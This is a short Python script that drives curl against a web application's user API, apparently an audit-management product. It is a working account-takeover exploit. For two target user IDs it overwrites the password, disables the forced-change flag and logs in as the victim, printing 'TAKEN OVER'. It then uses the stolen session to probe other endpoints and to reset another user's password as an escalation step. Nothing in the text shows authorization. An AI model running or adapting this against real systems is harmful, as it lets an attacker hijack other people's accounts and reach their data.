import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
PW="Zx9!low47test"
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or T),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def login(email,pw):
    cmd=['curl','-s','-m','30','-o','/tmp/l','-w','%{http_code}','-X','POST',H+'/api/v1/users/login',
         '-H',BB,'-H','Content-Type: application/json','-d',json.dumps({"credentials":{"email":email,"password":pw}})]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/l',encoding='utf-8',errors='replace').read()

for uid in [315, 311]:
    c,b=req('GET',f'/api/v1/users/{uid}')
    u=json.loads(b)['users'][0]
    print(f"=== target {uid}: {u['email']} role {u['role_id']} ===")
    c,b=req('PUT',f'/api/v1/users/{uid}',{"user":{"password":PW}})
    print("  password write ->",c, b[:100].replace(chr(10),' '))
    if c!='200': continue
    req('PUT',f'/api/v1/users/{uid}',{"user":{"requires_password_change":False}})
    c,b=login(u['email'],PW)
    print("  login ->",c)
    if c=='200':
        s=json.loads(b)['session']
        tok=s['token']
        print("  TAKEN OVER:",s['id'],s['email'],"role",s['role_id'])
        open(f'/tmp/tok{uid}','w').write(tok)
        # what can this limited token do?
        for p in ['/api/v1/users/me','/api/v1/users','/api/v1/users/1']:
            c2,b2=req('GET',p,tok=tok)
            print(f"     GET {p:22} -> {c2}")
        c2,b2=req('PUT','/api/v1/users/230',{"user":{"password":"Zx9!escal8"}},tok=tok)
        print(f"     PUT /users/230 (escalate) -> {c2} {b2[:110].replace(chr(10),' ')}")
    print()
